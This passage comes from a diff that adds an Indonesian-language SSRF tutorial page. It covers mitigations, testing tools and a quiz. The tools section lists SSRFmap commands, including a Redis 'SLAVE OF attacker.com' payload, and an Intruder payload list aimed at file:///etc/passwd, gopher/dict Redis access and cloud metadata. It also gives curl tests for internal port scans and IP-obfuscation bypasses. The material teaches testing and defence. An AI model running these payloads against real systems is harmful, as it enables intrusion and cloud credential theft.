+        const response = await fetch(targetUrl.toString(), {
+            timeout: 5000,  // Timeout 5 detik
+            redirect: 'error',  // Blokir redirect
+            headers: { 'Host': new URL(req.query.url).hostname }
+        });
+
+        res.json({
+            status: response.status,
+            body: (await response.text()).substring(0, 1000)
+        });
+    } catch (err) {
+        res.status(500).json({ error: 'Gagal mengambil URL' });
+    }
+});
+
+app.listen(3000, () => console.log('Server berjalan di port 3000'));</code></pre>
+      </div>
+
+      <h3>8.4 Ringkasan Pencegahan</h3>
+
+      <table class="net-table">
+        <thead>
+          <tr>
+            <th>Lapisan</th>
+            <th>Mitigasi</th>
+            <th>Prioritas</th>
+          </tr>
+        </thead>
+        <tbody>
+          <tr><td>Input Validation</td><td>Whitelist domain &amp; scheme yang diizinkan</td><td>🔴 Wajib</td></tr>
+          <tr><td>DNS Resolution</td><td>Resolve DNS terlebih dahulu, validasi IP hasil resolve</td><td>🔴 Wajib</td></tr>
+          <tr><td>Network Segmentation</td><td>Pisahkan web server dari service internal</td><td>🔴 Wajib</td></tr>
+          <tr><td>Egress Filtering</td><td>Batasi outbound traffic dari web server</td><td>🔴 Wajib</td></tr>
+          <tr><td>IMDSv2</td><td>Wajibkan token untuk metadata access (AWS)</td><td>🔴 Wajib</td></tr>
+          <tr><td>Disable Redirect</td><td>Blokir automatic redirect saat fetch URL</td><td>🟠 Penting</td></tr>
+          <tr><td>Schema Block</td><td>Blokir gopher://, file://, dict://, dll.</td><td>🟠 Penting</td></tr>
+          <tr><td>DNS Sinkhole</td><td>Redirect DNS metadata ke sinkhole</td><td>🟠 Penting</td></tr>
+          <tr><td>Timeout</td><td>Set timeout rendah pada HTTP client</td><td>🟡 Disarankan</td></tr>
+          <tr><td>Logging</td><td>Log semua outbound request untuk audit</td><td>🟡 Disarankan</td></tr>
+          <tr><td>WAF Rules</td><td>Deploy WAF rules untuk mendeteksi SSRF patterns</td><td>🟡 Disarankan</td></tr>
+          <tr><td>Least Privilege</td><td>Minimal IAM permissions untuk service di cloud</td><td>🔴 Wajib</td></tr>
+        </tbody>
+      </table>
+
+      <!-- ============================== -->
+      <!-- SECTION 9: Tools               -->
+      <!-- ============================== -->
+      <h2 id="tool">9. Tools Testing SSRF</h2>
+
+      <h3>9.1 SSRFmap</h3>
+
+      <div class="code-block">
+        <div class="code-header">
+          <span class="code-lang">Bash — SSRFmap</span>
+          <button class="code-copy" aria-label="Salin kode" onclick="copyToClipboard(this)">Salin</button>
+        </div>
+<pre><code># SSRFmap — Automatic SSRF fuzzer and exploitation tool
+# GitHub: https://github.com/swisskyrepo/SSRFmap
+
+# Install
+git clone https://github.com/swisskyrepo/SSRFmap.git
+cd SSRFmap
+pip install -r requirements.txt
+
+# Basic scan — detect SSRF vulnerability
+python ssrfmap.py -r request.txt -p url -m portscan
+
+# Request file format (request.txt):
+# POST /api/fetch HTTP/1.1
+# Host: vulnerable-app.com
+# Content-Type: application/json
+#
+# {"url": "FUZZ"}
+
+# === Scan modes ===
+
+# 1. Port scan internal
+python ssrfmap.py -r request.txt -p url -m portscan
+
+# 2. Read files
+python ssrfmap.py -r request.txt -p url -m readfiles
+
+# 3. Redis module
+python ssrfmap.py -r request.txt -p url -m redis -C "SLAVE OF attacker.com 6379"
+
+# 4. AWS metadata
+python ssrfmap.py -r request.txt -p url -m aws
+
+# 5. Custom wordlist
+python ssrfmap.py -r request.txt -p url -m portscan --ports 1-65535</code></pre>
+      </div>
+
+      <h3>9.2 Burp Suite — Collaborator</h3>
+
+      <div class="code-block">
+        <div class="code-header">
+          <span class="code-lang">Burp Suite — Blind SSRF Detection</span>
+          <button class="code-copy" aria-label="Salin kode" onclick="copyToClipboard(this)">Salin</button>
+        </div>
+<pre><code># === Menggunakan Burp Collaborator untuk Blind SSRF ===
+
+# 1. Generate Collaborator URL
+#    Burp Suite → Collaborator client → Copy to clipboard
+#    URL: xyz123.burpcollaborator.net
+
+# 2. Inject Collaborator URL ke semua input yang relevans
+#    Contoh payload:
+http://xyz123.burpcollaborator.net/
+
+# 3. Monitor Collaborator interactions
+#    Setiap request yang diterima menunjukkan:
+#    - Server melakukan request ke Collaborator
+#    - IP address server
+#    - Timestamp
+#    - Request headers
+
+# 4. Eksploitasi lanjutan
+#    - Gunakan HTTP callback (bukan DNS) untuk melihat lebih detail
+#    - Periksa User-Agent untuk fingerprint server
+#    - Gunakan path unik untuk identifikasi permintaan spesifik
+
+# === Automated SSRF Testing dengan Intruder ===
+
+# 1. Intercept request dengan parameter URL
+# 2. Kirim ke Intruder
+# 3. Set payload type: Simple list
+# 4. Payloads:
+http://127.0.0.1
+http://localhost
+http://[::1]
+http://169.254.169.254
+gopher://127.0.0.1:6379/
+file:///etc/passwd
+dict://127.0.0.1:6379/
+http://metadata.google.internal/
+http://169.254.169.254/metadata/instance
+# 5. Analyze responses untuk menemukan SSRF</code></pre>
+      </div>
+
+      <h3>9.3 curl Testing Manual</h3>
+
+      <div class="code-block">
+        <div class="code-header">
+          <span class="code-lang">curl — Manual SSRF Testing</span>
+          <button class="code-copy" aria-label="Salin kode" onclick="copyToClipboard(this)">Salin</button>
+        </div>
+<pre><code># === Manual SSRF Testing dengan curl ===
+
+# 1. Basic SSRF test
+curl -v "https://app.com/fetch?url=http://127.0.0.1/"
+
+# 2. File read test
+curl -v "https://app.com/fetch?url=file:///etc/passwd"
+
+# 3. Metadata test (AWS)
+curl -v "https://app.com/fetch?url=http://169.254.169.254/latest/meta-data/"
+
+# 4. Port scan test
+for port in 22 80 443 3306 5432 6379 8080 8443 9200; do
+    echo "--- Port $port ---"
+    curl -s -o /dev/null -w "HTTP %{http_code} Time: %{time_total}s\n" \
+        "https://app.com/fetch?url=http://127.0.0.1:$port/" \
+        --max-time 5
+done
+
+# 5. Protocol handler tests
+curl -v "https://app.com/fetch?url=gopher://127.0.0.1:6379/_INFO"
+curl -v "https://app.com/fetch?url=dict://127.0.0.1:6379/info"
+
+# 6. IP bypass tests
+curl -v "https://app.com/fetch?url=http://0x7f000001/"
+curl -v "https://app.com/fetch?url=http://2130706433/"
+curl -v "https://app.com/fetch?url=http://0177.0.0.1/"
+
+# 7. DNS rebinding test
+curl -v "https://app.com/fetch?url=http://rbndr.us/169.254.169.254"
+
+# 8. Redirect test
+curl -v "https://app.com/fetch?url=https://bit.ly/example-redirect"</code></pre>
+      </div>
+
+      <!-- ============================== -->
+      <!-- QUIZ                           -->
+      <!-- ============================== -->
+      <h2 id="quiz">10. Quiz Pemahaman</h2>
+      <p>Uji pemahaman Anda tentang SSRF:</p>
+
+      <div class="quiz-container" id="quizSSRF">
+        <div class="quiz-question">
+          <h3>Pertanyaan 1: Apa yang dimaksud dengan SSRF?</h3>
+          <div class="quiz-options">
+            <div class="quiz-option" data-question="0" data-answer="a">a) Client-side attack yang memanipulasi browser</div>
+            <div class="quiz-option" data-question="0" data-answer="b">b) Server-side attack di mana aplikasi dimanipulasi untuk membuat request yang tidak diinginkan</div>
+            <div class="quiz-option" data-question="0" data-answer="c">c) Serangan brute force pada password</div>
+            <div class="quiz-option" data-question="0" data-answer="d">d) Teknik phishing menggunakan server</div>
+          </div>
+        </div>
+
+        <div class="quiz-question">
+          <h3>Pertanyaan 2: Mengapa cloud metadata endpoint sangat berbahaya dalam SSRF?</h3>
+          <div class="quiz-options">
+            <div class="quiz-option" data-question="1" data-answer="a">a) Karena metadata hanya berisi informasi hostname</div>
+            <div class="quiz-option" data-question="1" data-answer="b">b) Karena metadata bisa berisi IAM credentials yang memungkinkan akses penuh ke resource cloud</div>
+            <div class="quiz-option" data-question="1" data-answer="c">c) Karena metadata menggunakan port yang sama dengan HTTPS</div>
+            <div class="quiz-option" data-question="1" data-answer="d">d) Karena metadata hanya tersedia di server fisik</div>
+          </div>
+        </div>
+
+        <div class="quiz-question">
+          <h3>Pertanyaan 3: Teknik DNS Rebinding bekerja dengan cara...</h3>
+          <div class="quiz-options">
+            <div class="quiz-option" data-question="2" data-answer="a">a) Mengubah IP address DNS setelah validasi melewati whitelist</div>
+            <div class="quiz-option" data-question="2" data-answer="b">b) Menggunakan DNS server yang lambat</div>
+            <div class="quiz-option" data-question="2" data-answer="c">c) Menghapus entri DNS dari cache</div>
+            <div class="quiz-option" data-question="2" data-answer="d">d) Menggunakan DNSSEC untuk enkripsi</div>
+          </div>
+        </div>
+
+        <div class="quiz-question">
+          <h3>Pertanyaan 4: Mana yang BUKAN merupakan mitigasi SSRF yang efektif?</h3>
+          <div class="quiz-options">
+            <div class="quiz-option" data-question="3" data-answer="a">a) Whitelist domain dan scheme</div>
+            <div class="quiz-option" data-question="3" data-answer="b">b) Hanya menggunakan firewall rules</div>
+            <div class="quiz-option" data-question="3" data-answer="c">c) Resolve DNS terlebih dahulu dan validasi IP</div>
+            <div class="quiz-option" data-question="3" data-answer="d">d) Network segmentation</div>
+          </div>
+        </div>
+
+        <div class="quiz-question">
+          <h3>Pertanyaan 5: IMDSv2 di AWS melindungi dari SSRF dengan cara...</h3>
+          <div class="quiz-options">
+            <div class="quiz-option" data-question="4" data-answer="a">a) Mengenkripsi semua metadata menggunakan TLS</div>
+            <div class="quiz-option" data-question="4" data-answer="b">b) Mengharuskan token yang didapat melalui PUT request dengan header khusus</div>
+            <div class="quiz-option" data-question="4" data-answer="c">c) Mematikan metadata service sepenuhnya</div>
+            <div class="quiz-option" data-question="4" data-answer="d">d) Mengubah port metadata dari 80 ke 443</div>
+          </div>
+        </div>
+
+        <button class="quiz-btn" aria-label="Periksa jawaban kuis">📝 Periksa Jawaban</button>
+        <div class="quiz-result"></div>
+      </div>
+
+      <!-- AD SLOT -->
+      <div class="ad-slot ad-slot-wide">
+      <ins class="adsbygoogle"
+           style="display:block"
+           data-ad-client="ca-pub-2122797411859663"
+           data-ad-format="auto"
+           data-full-width-responsive="true"></ins>
+      <script>(adsbygoogle = window.adsbygoogle || []).push({});</script>
+    
+
+      <!-- ARTICLE NAVIGATION -->
+      <div class="article-nav">
+        <a href="cert-kubernetes-cka.html" class="prev">
+          <span class="nav-label">← Sebelumnya</span>
+          <span class="nav-title">Kubernetes CKA: Sertifikasi</span>
+        </a>
+        <a href="metasploit-basics.html" class="next">
+          <span class="nav-label">Selanjutnya →</span>
+          <span class="nav-title">Metasploit: Penetration Testing</span>
+        </a>
+      </div>
+
+    </div>
+  
+    <div class="related-articles">
+      <h3>📚 Artikel Terkait</h3>
+      <div class="related-grid">
+                <a href="/articles/metasploit-basics.html" class="related-card">
+          <span class="related-category">Cybersecurity</span>
+          <span class="related-title">Metasploit: Penetration Testing Framework Lengkap</span>
+        </a>
+        <a href="/articles/sqlmap-automation.html" class="related-card">
+          <span class="related-category">Cybersecurity</span>
+          <span class="related-title">SQLMap: SQL Injection Automation Lengkap</span>
+        </a>
+        <a href="/articles/red-team-operations.html" class="related-card">
+          <span class="related-category">Cybersecurity</span>
+          <span class="related-title">Red Team Operations: Planning, Execution & Reporting</span>
+        </a>
+
+      </div>
+    </div>
+</article>
+
+  <!-- ========== NEWSLETTER ========== -->
+  <section class="newsletter-section" id="newsletter">
+    <div class="container">
+      <div class="newsletter-card fade-in">
+        <h2>📬 Dapatkan Tutorial Terbaru</h2>
+        <p>Subscribe untuk mendapatkan tutorial terbaru langsung di inbox kamu. Gratis, tanpa spam.</p>
+        <form class="newsletter-form" onsubmit="handleSubscribe(event)">
+          <input type="email" placeholder="email@kamu.com" required>
+          <button type="submit" class="btn-primary">Subscribe</button>
+        </form>
+      </div>
+    </div>
+  </section>
+
+  <!-- ========== FOOTER ========== -->
